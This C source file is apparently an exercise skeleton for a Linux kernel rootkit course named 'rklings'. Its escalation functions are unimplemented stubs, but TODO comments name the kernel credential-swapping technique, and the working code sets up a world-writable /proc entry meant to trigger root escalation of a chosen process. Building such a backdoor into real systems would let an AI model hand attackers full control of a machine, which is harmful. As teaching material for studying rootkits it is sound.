// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>

// TODO: rk_escalate (prepare_kernel_cred + commit_creds for current)
static int rk_escalate(void)
{
	return -ENOSYS;
}

// TODO: rk_escalate_pid (rcu_read_lock + pid_task + rcu_assign_pointer)
static int rk_escalate_pid(pid_t pid)
{
	return -ENOSYS;
}

static pid_t deferred_pid;
static struct proc_dir_entry *proc_entry;

// TODO: cmd_escalate (no arg = self, with arg = set deferred_pid)
static int cmd_escalate(const char *arg)
{
	return -ENOSYS;
}

static int rk_proc_show(struct seq_file *m, void *v)
{
	if (deferred_pid)
		seq_printf(m, "pending: %d\n", deferred_pid);
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf,
			     size_t count, loff_t *ppos)
{
	if (!deferred_pid)
		return count;
	if (rk_escalate_pid(deferred_pid) == 0)
		deferred_pid = 0;
	return count;
}

static const struct proc_ops rk_proc_ops = {
    .proc_open = rk_proc_open,
    .proc_read = seq_read,
    .proc_write = rk_proc_write,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

int rk_proc_init(void)
{
	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry)
		return -ENOMEM;
	return 0;
}

void rk_proc_exit(void)
{
	proc_remove(proc_entry);
}

int rk_escalate_init(void)
{
	return rk_cmd_register("e", cmd_escalate);
}
